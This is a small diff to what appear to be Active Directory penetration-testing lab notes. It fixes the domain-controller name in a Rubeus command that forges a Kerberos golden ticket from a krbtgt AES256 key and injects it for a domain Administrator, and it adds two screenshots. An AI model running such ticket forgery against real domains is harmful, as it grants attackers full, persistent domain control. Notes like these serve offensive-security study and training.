@@ -360,5 +360,9 @@ The Golden ticket forging command looks like this:
 C:\AD\Tools\Rubeus.exe golden 
 /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 
 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1 
-/logoncount:2453 /netbios:dcorp /groups:544,512,520,513 /dc:DCORPDC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
+/logoncount:2453 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
 ```
+
+<img width="1195" height="533" alt="image" src="https://github.com/user-attachments/assets/8cabefb2-e6fe-4e33-bb46-2f8daddbbf88" />
+<img width="1156" height="428" alt="image" src="https://github.com/user-attachments/assets/bbd54335-ba90-4c85-b45d-f35481e72c32" />
+
